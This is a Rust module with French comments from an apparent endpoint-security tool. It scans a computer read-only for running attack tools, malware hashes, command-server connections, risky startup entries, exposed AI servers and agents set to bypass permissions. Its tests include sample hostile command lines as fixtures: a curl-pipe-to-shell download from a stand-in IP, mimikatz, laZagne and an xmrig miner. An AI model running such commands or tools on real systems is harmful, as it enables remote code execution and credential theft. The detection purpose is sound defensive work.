//! Les menaces que le blocage sait arrêter, cherchées sur cet ordinateur : d'où elles viennent, certaines ou
//! douteuses, et le geste qui les bloque. Rien n'est changé ici : seulement lu.

use std::collections::{HashMap, HashSet};
use std::net::IpAddr;
use std::path::{Path, PathBuf};

use super::parametres::Categorie;
use crate::machine::chasse::{self, EnMarche};
use crate::machine::regles::Os;
use crate::protection::empreintes::{self, Empreintes};
use crate::ui::{affichable, chemin_affichable};
use crate::{tr, trf};

/// Le geste qui bloque une menace.
#[derive(Clone, Debug, PartialEq, Eq)]
pub(crate) enum Geste {
    /// Arrêter le processus (s'il tourne), puis mettre son fichier en quarantaine (s'il est là).
    Programme {
        pid: Option<u32>,
        /// Son nom, prêt à montrer.
        nom: String,
        /// Le programme du processus à la détection : relu avant de l'arrêter.
        chemin: Option<PathBuf>,
        /// Le fichier à mettre en quarantaine : le programme, sauf un interpréteur ou un shell, jamais isolé (au plus
        /// le script qu'il lance) ; `None` : l'arrêt seul.
        fichier: Option<PathBuf>,
        /// Ce qui l'a désigné, gardé avec le fichier dans la quarantaine.
        detection: String,
    },
    /// Une règle de pare-feu sortante vers l'adresse.
    Adresse { ip: IpAddr },
    /// Retirer un lancement automatique (le réglage « demarrage:… » d'Optimiser).
    Demarrage { id: String, nom: String, machine: bool },
    /// La liste de blocage des pilotes vulnérables de Microsoft (Windows).
    #[cfg(windows)]
    Pilotes { avant: Option<u32> },
    /// Fermer au réseau le port d'un serveur d'IA.
    ServeurIa { port: u16, nom: String },
    /// Remettre les demandes de permission d'un agent réglé pour tout faire sans demander.
    Permissions { fichier: PathBuf, outil: String },
}

/// Une menace trouvée.
#[derive(Clone, Debug)]
pub(crate) struct Menace {
    pub categorie: Categorie,
    /// Certaine (empreinte de MalwareBazaar, outil d'attaque connu, serveur de commande) : seule une menace certaine
    /// peut être bloquée toute seule.
    pub certaine: bool,
    /// Ce qui a été trouvé, prêt à montrer.
    pub quoi: String,
    /// Reconnue d'un passage à l'autre (« connexion:203.0.113.7 ») : une menace déjà bloquée n'est pas reproposée.
    pub cle: String,
    pub geste: Geste,
}

/// Ce que la recherche a trouvé, et ce qu'elle n'a pas pu vérifier (dit, jamais compté comme sain).
#[derive(Default)]
pub(crate) struct Trouvees {
    pub menaces: Vec<Menace>,
    pub non_verifie: Vec<String>,
    /// Les processus à ne jamais arrêter (Vanguard, ce qu'il a lancé, ce qui le fait tourner).
    pub intouchables: HashSet<u32>,
}

/// Au-delà, un fichier n'est pas haché : un logiciel malveillant connu est presque toujours bien plus petit, et la
/// surveillance horaire ne doit pas relire des gigaoctets.
const TAILLE_MAX: u64 = 256 << 20;
/// Les fichiers des Téléchargements arrivés depuis une semaine, jusqu'à 64 Mio et 300 fichiers.
const TELECHARGES_MAX: u64 = 64 << 20;
const TELECHARGES_NOMBRE: usize = 300;
const SEMAINE: std::time::Duration = std::time::Duration::from_hours(7 * 24);

/// Le jugement d'un programme en marche.
#[derive(Debug, PartialEq, Eq)]
pub(crate) struct Jugement {
    /// Seul le certain se bloque tout seul.
    pub certaine: bool,
    pub raison: String,
    /// Le mot de la ligne de commande qui désigne le script, quand l'outil a été reconnu par un argument.
    pub script: Option<String>,
}

/// Le jugement d'un programme en marche, ou `None`. Certain : un outil d'attaque connu reconnu au programme lui-même
/// (son nom, son fichier, le premier mot de sa ligne), ou une empreinte connue de MalwareBazaar. Douteux : un outil
/// reconnu seulement par un argument d'un interpréteur (`python3 laZagne.py` : le processus est Python), et le reste
/// de COM-PRG-001 (commande qui télécharge ou se cache, dossier où rien ne s'installe).
pub(crate) fn juger_programme(p: &EnMarche, os: Os, connu: &mut impl FnMut(&str) -> bool) -> Option<Jugement> {
    if let Some((raison, origine)) = chasse::offensif(p) {
        let (certaine, script) = match origine {
            chasse::Origine::Programme => (true, None),
            chasse::Origine::Argument(mot) => (false, Some(mot)),
        };
        return Some(Jugement {
            certaine,
            raison: trf!("outil offensif : {raison}", "offensive tool: {raison}"),
            script,
        });
    }
    if p.chemin.as_deref().is_some_and(&mut *connu) {
        return Some(Jugement {
            certaine: true,
            raison: tr!(
                "empreinte SHA-256 connue de MalwareBazaar",
                "SHA-256 fingerprint known to MalwareBazaar"
            )
            .to_string(),
            script: None,
        });
    }
    chasse::juger_programme(p, os).map(|s| Jugement {
        certaine: false,
        raison: s.raison.to_string(),
        script: None,
    })
}

/// Les shells et autres programmes qui exécutent le code qu'on leur donne, en plus des interpréteurs de `chasse`.
const SHELLS: [&str; 24] = [
    "sh",
    "bash",
    "dash",
    "zsh",
    "fish",
    "ksh",
    "mksh",
    "csh",
    "tcsh",
    "busybox",
    "env",
    "cmd",
    "cscript",
    "wscript",
    "mshta",
    "osascript",
    "php",
    "lua",
    "luajit",
    "deno",
    "bun",
    "tclsh",
    "rscript",
    "julia",
];

/// Un interpréteur ou un shell, quelle que soit sa version (« python3.12 », « pwsh.exe », « bash ») : jamais mis en
/// quarantaine, ce serait casser tout Python, PowerShell ou le shell du compte (pyenv, nvm, Homebrew…).
pub(crate) fn lance_du_code(fichier: &str) -> bool {
    let nom = chasse::nom_de_fichier(fichier).to_ascii_lowercase();
    if chasse::interpreteur(&nom) {
        return true;
    }
    let nom = nom.strip_suffix(".exe").unwrap_or(&nom);
    SHELLS.contains(&nom.trim_end_matches(|c: char| c.is_ascii_digit() || c == '.'))
}

/// Un chemin complet, sous Linux, macOS ou Windows, quel que soit le système où tourne le test.
fn absolu(chemin: &str) -> bool {
    let o = chemin.as_bytes();
    chemin.starts_with('/')
        || chemin.starts_with(r"\\")
        || (o.len() > 2 && o[0].is_ascii_alphabetic() && o[1] == b':' && matches!(o[2], b'\\' | b'/'))
}

/// Le fichier à mettre en quarantaine pour ce processus : son programme, sauf un interpréteur ou un shell. Pour
/// ceux-là, seulement le script désigné (`script`, le mot reconnu ; sinon le premier argument qui n'est pas une
/// option), résolu en chemin complet (relatif : depuis `dossier`, le dossier de travail du processus), qui existe
/// (`existe`) et n'est pas lui-même un interpréteur. `None` : rien à isoler, l'arrêt seul.
pub(crate) fn a_isoler(
    p: &EnMarche,
    script: Option<&str>,
    dossier: Option<&Path>,
    existe: impl Fn(&Path) -> bool,
) -> Option<PathBuf> {
    let chemin = p.chemin.as_deref()?;
    if !lance_du_code(chemin) {
        return Some(PathBuf::from(chemin));
    }
    let ligne = p.ligne.as_deref().unwrap_or("");
    let mot = script.or_else(|| ligne.split_whitespace().skip(1).find(|m| !m.starts_with('-')))?;
    let mot = mot.trim_matches(['"', '\'']);
    if mot.is_empty() || lance_du_code(mot) {
        return None;
    }
    let fichier = if absolu(mot) {
        PathBuf::from(mot)
    } else {
        dossier?.join(mot)
    };
    existe(&fichier).then_some(fichier)
}

/// Le dossier de travail d'un processus, pour résoudre le chemin relatif de son script (Linux seulement).
fn dossier_de_travail(pid: u32) -> Option<PathBuf> {
    if cfg!(target_os = "linux") {
        std::fs::read_link(format!("/proc/{pid}/cwd")).ok()
    } else {
        None
    }
}

/// La menace d'un programme en marche jugé dangereux.
fn menace_programme(p: &EnMarche, j: Jugement) -> Menace {
    let nom = affichable(&p.nom);
    let raison = j.raison;
    let dossier = dossier_de_travail(p.pid);
    let fichier = a_isoler(p, j.script.as_deref(), dossier.as_deref(), Path::is_file);
    Menace {
        categorie: Categorie::Programmes,
        certaine: j.certaine,
        quoi: trf!("« {nom} » (PID {}) : {raison}", "“{nom}” (PID {}): {raison}", p.pid),
        cle: format!("programme:{}:{}", p.pid, p.chemin.as_deref().unwrap_or("")),
        geste: Geste::Programme {
            pid: Some(p.pid),
            nom,
            chemin: p.chemin.as_ref().map(PathBuf::from),
            fichier,
            detection: raison,
        },
    }
}

/// L'empreinte d'un fichier est-elle connue ? Seulement un vrai fichier, pas trop gros ; chaque chemin haché une fois.
fn connu_par(empreintes: Option<&Empreintes>, cache: &mut HashMap<String, bool>, chemin: &str) -> bool {
    let Some(e) = empreintes else {
        return false;
    };
    *cache.entry(chemin.to_string()).or_insert_with(|| {
        std::fs::metadata(chemin)
            .ok()
            .filter(|m| m.is_file() && m.len() <= TAILLE_MAX)
            .and_then(|_| empreintes::sha256(Path::new(chemin)))
            .is_some_and(|h| e.contient(&h))
    })
}

fn programmes(empreintes: Option<&Empreintes>, os: Os, t: &mut Trouvees) {
    let Some((liste, intouchables)) = chasse::en_marche() else {
        t.non_verifie.push(
            tr!(
                "programmes en marche : liste illisible",
                "running programs: list unreadable"
            )
            .to_string(),
        );
        return;
    };
    let mut cache = HashMap::new();
    for p in liste.iter().filter(|p| !intouchables.contains(&p.pid)) {
        let mut connu = |c: &str| connu_par(empreintes, &mut cache, c);
        if let Some(j) = juger_programme(p, os, &mut connu) {
            t.menaces.push(menace_programme(p, j));
        }
    }
    t.intouchables = intouchables;
    // Les fichiers arrivés dans Téléchargements cette semaine : seulement ceux que MalwareBazaar connaît.
    let Some(e) = empreintes else { return };
    let Some(dossier) = crate::protection::telechargement::dossier_telechargements() else {
        return;
    };
    let deja: HashSet<PathBuf> = t
        .menaces
        .iter()
        .filter_map(|m| match &m.geste {
            Geste::Programme { fichier, .. } => fichier.clone(),
            _ => None,
        })
        .collect();
    let recents = std::fs::read_dir(&dossier)
        .into_iter()
        .flatten()
        .flatten()
        .filter_map(|f| {
            let m = std::fs::symlink_metadata(f.path()).ok()?;
            let recent = m.modified().ok()?.elapsed().is_ok_and(|a| a < SEMAINE);
            (m.is_file() && recent && m.len() <= TELECHARGES_MAX).then(|| f.path())
        })
        .filter(|c| !deja.contains(c))
        .take(TELECHARGES_NOMBRE);
    for chemin in recents {
        if empreintes::sha256(&chemin).is_some_and(|h| e.contient(&h)) {
            let montre = chemin_affichable(&chemin);
            let nom = chemin
                .file_name()
                .map_or_else(|| montre.clone(), |n| affichable(&n.to_string_lossy()));
            let raison = tr!(
                "empreinte SHA-256 connue de MalwareBazaar",
                "SHA-256 fingerprint known to MalwareBazaar"
            );
            t.menaces.push(Menace {
                categorie: Categorie::Programmes,
                certaine: true,
                quoi: trf!(
                    "« {nom} », dans Téléchargements : {raison}",
                    "“{nom}”, in Downloads: {raison}"
                ),
                cle: format!("fichier:{}", chemin.display()),
                geste: Geste::Programme {
                    pid: None,
                    nom: montre,
                    chemin: Some(chemin.clone()),
                    fichier: Some(chemin),
                    detection: raison.to_string(),
                },
            });
        }
    }
}

fn connexions(t: &mut Trouvees) {
    let Some((liste, absentes)) = crate::protection::sortantes::connexions_botnets() else {
        t.non_verifie.push(
            tr!(
                "connexions en cours : illisibles",
                "connections in progress: unreadable"
            )
            .to_string(),
        );
        return;
    };
    t.non_verifie.extend(absentes);
    let mut vues = HashSet::new();
    for c in liste {
        if !vues.insert(c.adresse) {
            continue;
        }
        let programme = c
            .programme
            .unwrap_or_else(|| tr!("programme d'un autre compte", "another account's program").to_string());
        let pid = c.pid.map(|p| format!(" (PID {p})")).unwrap_or_default();
        t.menaces.push(Menace {
            categorie: Categorie::Connexions,
            certaine: true,
            quoi: trf!(
                "{programme}{pid} parle à un serveur de commande connu : {}",
                "{programme}{pid} talks to a known command server: {}",
                c.serveur
            ),
            cle: format!("connexion:{}", c.adresse),
            geste: Geste::Adresse { ip: c.adresse },
        });
    }
}

/// Le fichier lancé par une commande de démarrage : entre guillemets, sinon jusqu'à « .exe » (Windows, où un chemin
/// sans guillemets peut contenir des espaces), sinon le premier mot. `None` : pas un chemin complet (un programme
/// trouvé dans le PATH ne se juge pas ici).
pub(crate) fn fichier_de_commande(commande: &str, os: Os) -> Option<String> {
    let c = commande.trim();
    let fichier = if let Some(reste) = c.strip_prefix('"') {
        reste.split('"').next()?.to_string()
    } else if os == Os::Windows {
        let bas = c.to_ascii_lowercase();
        match bas.find(".exe") {
            Some(i) => c.get(..i + 4)?.to_string(),
            None => c.split_whitespace().next()?.to_string(),
        }
    } else {
        c.split_whitespace().next()?.to_string()
    };
    let complet = match os {
        Os::Windows => {
            let o = fichier.as_bytes();
            fichier.starts_with(r"\\")
                || (o.len() > 2 && o[0].is_ascii_alphabetic() && o[1] == b':' && matches!(o[2], b'\\' | b'/'))
        }
        _ => fichier.starts_with('/'),
    };
    complet.then_some(fichier)
}

fn demarrage(empreintes: Option<&Empreintes>, os: Os, t: &mut Trouvees) {
    let mut cache = HashMap::new();
    for e in crate::optimiser::demarrage_retirables() {
        let Some(fichier) = fichier_de_commande(&e.commande, os) else {
            continue;
        };
        let (certaine, raison) = if connu_par(empreintes, &mut cache, &fichier) {
            (
                true,
                tr!(
                    "empreinte SHA-256 connue de MalwareBazaar",
                    "SHA-256 fingerprint known to MalwareBazaar"
                ),
            )
        } else if let Some(raison) = chasse::dossier_douteux(&fichier, os) {
            (false, raison)
        } else {
            continue;
        };
        let nom = e.nom;
        t.menaces.push(Menace {
            categorie: Categorie::Demarrage,
            certaine,
            quoi: trf!(
                "« {nom} » se lance au démarrage : {raison}",
                "“{nom}” starts at login: {raison}"
            ),
            cle: e.id.clone(),
            geste: Geste::Demarrage {
                id: e.id,
                nom,
                machine: e.machine,
            },
        });
    }
    #[cfg(windows)]
    pilotes(t);
}

/// La liste de blocage des pilotes vulnérables est-elle à activer ? `valeur` : VulnerableDriverBlocklistEnable
/// (absente : `None`) ; `build` : le numéro de Windows. Depuis Windows 11 22H2 (22621), elle est active quand la
/// valeur manque ; 0 la coupe (le basculeur de Sécurité Windows).
#[cfg(any(windows, test))]
pub(crate) fn pilotes_a_bloquer(valeur: Option<u32>, build: Option<u32>) -> Option<&'static str> {
    match valeur {
        Some(0) => Some(tr!(
            "la liste de blocage des pilotes vulnérables de Microsoft est coupée",
            "Microsoft's vulnerable driver blocklist is turned off"
        )),
        Some(_) => None,
        None if build.is_some_and(|b| b >= 22621) => None,
        None => Some(tr!(
            "la liste de blocage des pilotes vulnérables de Microsoft n'est pas activée",
            "Microsoft's vulnerable driver blocklist is not turned on"
        )),
    }
}

#[cfg(windows)]
fn pilotes(t: &mut Trouvees) {
    use winreg::enums::HKEY_LOCAL_MACHINE;
    let hklm = winreg::RegKey::predef(HKEY_LOCAL_MACHINE);
    let valeur = hklm
        .open_subkey(crate::machine::windows::corrections::PILOTES_VULNERABLES)
        .ok()
        .and_then(|k| k.get_value::<u32, _>("VulnerableDriverBlocklistEnable").ok());
    let build = hklm
        .open_subkey(r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
        .ok()
        .and_then(|k| k.get_value::<String, _>("CurrentBuildNumber").ok())
        .and_then(|b| b.trim().parse().ok());
    if let Some(raison) = pilotes_a_bloquer(valeur, build) {
        t.menaces.push(Menace {
            categorie: Categorie::Demarrage,
            certaine: false,
            quoi: raison.to_string(),
            cle: "pilotes-vulnerables".into(),
            geste: Geste::Pilotes { avant: valeur },
        });
    }
}

/// Les serveurs d'IA ouverts au réseau, d'après les ports en écoute : un par port, sauf ceux que Vanguard a déjà
/// fermés (`fermes`).
pub(crate) fn serveurs_ouverts(
    prises: &[crate::machine::agents_ia::Prise],
    fermes: &HashSet<u16>,
) -> Vec<(u16, String)> {
    let mut vus = HashSet::new();
    prises
        .iter()
        .filter(|p| {
            !p.adresse
                .trim_matches(['[', ']'])
                .parse::<IpAddr>()
                .is_ok_and(|a| a.is_loopback())
        })
        .filter(|p| !fermes.contains(&p.port))
        .filter_map(|p| Some((p.port, crate::machine::agents_ia::serveur_ia(p)?)))
        .filter(|(port, _)| vus.insert(*port))
        .collect()
}

fn agents(t: &mut Trouvees) {
    use crate::machine::agents_ia;
    match agents_ia::prises() {
        Some(prises) => {
            for (port, nom) in serveurs_ouverts(&prises, &agents_ia::ports_fermes()) {
                let nom = affichable(&nom);
                t.menaces.push(Menace {
                    categorie: Categorie::AgentsIa,
                    certaine: false,
                    quoi: trf!(
                        "{nom} ouvert au réseau sans mot de passe (port {port})",
                        "{nom} open to the network without a password (port {port})"
                    ),
                    cle: format!("serveur-ia:{port}"),
                    geste: Geste::ServeurIa { port, nom },
                });
            }
        }
        None => t.non_verifie.push(
            tr!(
                "serveurs d'IA : ports en écoute illisibles",
                "AI servers: listening ports unreadable"
            )
            .to_string(),
        ),
    }
    for (outil, fichier) in agents_ia::fichiers_de_reglages() {
        let Some(json) = std::fs::read(&fichier).ok().and_then(|o| agents_ia::lire_json(&o)) else {
            continue;
        };
        if agents_ia::tout_permis(&json) {
            let montre = chemin_affichable(&fichier);
            t.menaces.push(Menace {
                categorie: Categorie::AgentsIa,
                certaine: false,
                quoi: trf!(
                    "{outil} réglé pour tout faire sans demander (bypassPermissions) : {montre}",
                    "{outil} set to do everything without asking (bypassPermissions): {montre}"
                ),
                cle: format!("permissions:{}", fichier.display()),
                geste: Geste::Permissions {
                    fichier,
                    outil: outil.to_string(),
                },
            });
        }
    }
}

/// Cherche les menaces des catégories demandées. `telecharger` : la liste de MalwareBazaar peut être téléchargée
/// (protection active des programmes) ; sinon seule la copie gardée sert, et son absence est dite.
pub(crate) fn chercher(categories: &[Categorie], telecharger: bool) -> Trouvees {
    let os = Os::actuel();
    let mut t = Trouvees::default();
    let veut = |c: Categorie| categories.contains(&c);
    let empreintes = if veut(Categorie::Programmes) || veut(Categorie::Demarrage) {
        let e = if telecharger {
            empreintes::connues()
        } else {
            empreintes::gardees()
        };
        match e {
            Err(raison) => t.non_verifie.push(trf!(
                "empreintes de MalwareBazaar {raison}",
                "MalwareBazaar fingerprints {raison}"
            )),
            Ok(Empreintes {
                avertissement: Some(a), ..
            }) => t.non_verifie.push(a.clone()),
            Ok(_) => {}
        }
        e.ok()
    } else {
        None
    };
    if veut(Categorie::Programmes) {
        programmes(empreintes, os, &mut t);
    }
    if veut(Categorie::Connexions) {
        connexions(&mut t);
    }
    if veut(Categorie::Demarrage) {
        demarrage(empreintes, os, &mut t);
    }
    if veut(Categorie::AgentsIa) {
        agents(&mut t);
    }
    // Une menace déjà bloquée par Vanguard (règle en place) n'est pas reproposée.
    let bloquees: HashSet<String> = crate::changements::blocages_en_place()
        .into_iter()
        .map(|(_, b)| b.cle)
        .collect();
    t.menaces.retain(|m| !bloquees.contains(&m.cle));
    t
}

#[cfg(test)]
mod tests {
    use super::*;

    fn programme(nom: &str, chemin: &str, ligne: &str) -> EnMarche {
        EnMarche {
            pid: 4242,
            parent: Some(1),
            nom: nom.into(),
            chemin: Some(chemin.into()),
            ligne: Some(ligne.into()),
            ..EnMarche::default()
        }
    }

    /// Certain : un outil d'attaque connu, une empreinte connue. Douteux : le reste de COM-PRG-001. Rien sinon.
    #[test]
    fn programmes_certains_ou_douteux() {
        let mut jamais = |_: &str| false;
        let mimikatz = programme(
            "mimikatz.exe",
            r"C:\Users\alice\Downloads\mimikatz.exe",
            "mimikatz.exe privilege::debug",
        );
        assert!(juger_programme(&mimikatz, Os::Windows, &mut jamais).is_some_and(|j| j.certaine));
        let mineur = programme(
            "svc-update",
            "/home/alice/.cache/svc-update",
            "/home/alice/.cache/svc-update",
        );
        assert_eq!(juger_programme(&mineur, Os::Linux, &mut jamais), None);
        let mut connu = |c: &str| c == "/home/alice/.cache/svc-update";
        assert!(
            juger_programme(&mineur, Os::Linux, &mut connu)
                .is_some_and(|j| j.certaine && j.raison.contains("MalwareBazaar"))
        );
        let telechargeur = programme(
            "bash",
            "/home/alice/.local/bin/bash2",
            "bash -c curl http://203.0.113.7/x | sh",
        );
        assert!(juger_programme(&telechargeur, Os::Linux, &mut jamais).is_some_and(|j| !j.certaine));
        let lance = programme(
            "facture",
            "/home/alice/Downloads/facture",
            "/home/alice/Downloads/facture",
        );
        assert!(juger_programme(&lance, Os::Linux, &mut jamais).is_some_and(|j| !j.certaine));
        let m = menace_programme(
            &lance,
            Jugement {
                certaine: false,
                raison: "x".into(),
                script: None,
            },
        );
        assert_eq!(m.categorie, Categorie::Programmes);
        assert!(matches!(m.geste, Geste::Programme { pid: Some(4242), .. }));
    }

    /// Défaut de la relecture : un argument qui ressemble au nom d'un outil ne rendait l'interpréteur « certain »,
    /// et l'automatique arrêtait puis isolait Python lui-même. Un argument n'est plus qu'un doute, le nom doit être
    /// entier, et un interpréteur n'est jamais mis en quarantaine.
    #[test]
    fn interpreteur_jamais_certain_par_un_argument_ni_isole() {
        let mut jamais = |_: &str| false;
        let pyenv = "/home/alice/.pyenv/versions/3.12.4/bin/python3.12";
        // Un nom d'outil seulement en préfixe : rien.
        for ligne in ["python3 sharphound_parser.py", "python3 xmrig_stats.py --jour"] {
            assert_eq!(
                juger_programme(&programme("python3", pyenv, ligne), Os::Linux, &mut jamais),
                None
            );
        }
        let windows = r"C:\Users\alice\AppData\Local\Programs\PowerShell\pwsh.exe";
        assert_eq!(
            juger_programme(
                &programme("pwsh.exe", windows, "pwsh ./Rubeus-Audit.ps1"),
                Os::Windows,
                &mut jamais
            ),
            None
        );
        // Le script lui-même, par un argument : douteux, jamais certain.
        let lazagne = programme("python3", pyenv, "python3 /home/alice/outils/laZagne.py all");
        let j = juger_programme(&lazagne, Os::Linux, &mut jamais).unwrap();
        assert!(!j.certaine);
        assert_eq!(j.script.as_deref(), Some("/home/alice/outils/laZagne.py"));
        // Ce qui est mis en quarantaine : le script désigné, jamais l'interpréteur.
        let partout = |_: &Path| true;
        assert_eq!(
            a_isoler(&lazagne, j.script.as_deref(), None, partout),
            Some(PathBuf::from("/home/alice/outils/laZagne.py"))
        );
        // Script relatif : résolu depuis le dossier de travail, sinon rien d'isolé (l'arrêt seul).
        let relatif = programme("python3", pyenv, "python3 ./laZagne.py all");
        assert_eq!(
            a_isoler(
                &relatif,
                Some("./laZagne.py"),
                Some(Path::new("/home/alice/outils")),
                partout
            ),
            Some(PathBuf::from("/home/alice/outils/./laZagne.py"))
        );
        assert_eq!(a_isoler(&relatif, Some("./laZagne.py"), None, partout), None);
        // Script introuvable, code passé en ligne, ou un autre interpréteur en argument : l'arrêt seul.
        assert_eq!(a_isoler(&lazagne, j.script.as_deref(), None, |_: &Path| false), None);
        assert_eq!(
            a_isoler(
                &programme("bash", "/opt/homebrew/bin/bash", "bash -c id"),
                None,
                None,
                partout
            ),
            None
        );
        assert_eq!(
            a_isoler(
                &programme("env", "/home/alice/bin/env", "env python3 x.py"),
                None,
                None,
                partout
            ),
            None
        );
        // Un programme ordinaire : son propre fichier.
        let xmrig = programme("xmrig", "/home/alice/.cache/xmrig", "./xmrig -o pool.example:3333");
        assert!(juger_programme(&xmrig, Os::Linux, &mut jamais).is_some_and(|j| j.certaine));
        assert_eq!(
            a_isoler(&xmrig, None, None, partout),
            Some(PathBuf::from("/home/alice/.cache/xmrig"))
        );
        for nom in [
            "python3.12",
            "pwsh.exe",
            "bash",
            "node",
            r"C:\Windows\System32\cmd.exe",
            "zsh",
        ] {
            assert!(lance_du_code(nom), "{nom}");
        }
        assert!(!lance_du_code("xmrig") && !lance_du_code("facture.pdf.exe"));
    }

    #[test]
    fn fichier_d_une_commande_de_demarrage() {
        let w = |c| fichier_de_commande(c, Os::Windows);
        assert_eq!(
            w(r#""C:\Users\alice\AppData\Local\Temp\maj.exe" --silencieux"#).as_deref(),
            Some(r"C:\Users\alice\AppData\Local\Temp\maj.exe")
        );
        assert_eq!(
            w(r"C:\Program Files\Outil Exemple\outil.EXE /min").as_deref(),
            Some(r"C:\Program Files\Outil Exemple\outil.EXE")
        );
        assert_eq!(w("outil.exe /min"), None);
        assert_eq!(
            w(r"\\serveur\partage\x.exe").as_deref(),
            Some(r"\\serveur\partage\x.exe")
        );
        let l = |c| fichier_de_commande(c, Os::Linux);
        assert_eq!(
            l("/home/alice/.local/bin/agent --tray %U").as_deref(),
            Some("/home/alice/.local/bin/agent")
        );
        assert_eq!(l("discord --start-minimized"), None);
        assert_eq!(
            l("\"/home/alice/Mes jeux/lanceur\" -x").as_deref(),
            Some("/home/alice/Mes jeux/lanceur")
        );
        assert_eq!(l(""), None);
    }

    #[test]
    fn liste_des_pilotes_vulnerables() {
        assert!(
            pilotes_a_bloquer(Some(0), Some(26100)).is_some(),
            "coupée par le basculeur"
        );
        assert_eq!(pilotes_a_bloquer(Some(1), Some(19045)), None);
        assert_eq!(
            pilotes_a_bloquer(None, Some(22621)),
            None,
            "active d'office depuis 22H2"
        );
        assert!(pilotes_a_bloquer(None, Some(19045)).is_some(), "Windows 10");
        assert!(pilotes_a_bloquer(None, None).is_some());
    }

    #[test]
    fn serveurs_d_ia_a_fermer() {
        use crate::machine::agents_ia::Prise;
        let prise = |adresse: &str, port, programme: &str| Prise {
            adresse: adresse.into(),
            port,
            programme: programme.into(),
        };
        let prises = [
            prise("0.0.0.0", 11434, "ollama"),
            prise("[::]", 11434, "ollama"),
            prise("127.0.0.1", 1234, "lm studio"),
            prise("0.0.0.0", 7860, "python3"),
            prise("0.0.0.0", 8080, "nginx"),
        ];
        assert_eq!(
            serveurs_ouverts(&prises, &HashSet::new()),
            [
                (11434, "Ollama".to_string()),
                (
                    7860,
                    "Gradio (Stable Diffusion WebUI, text-generation-webui)".to_string()
                )
            ]
        );
        // Un port déjà fermé par Vanguard n'est pas reproposé.
        assert_eq!(serveurs_ouverts(&prises, &[11434, 7860].into()), []);
    }
}
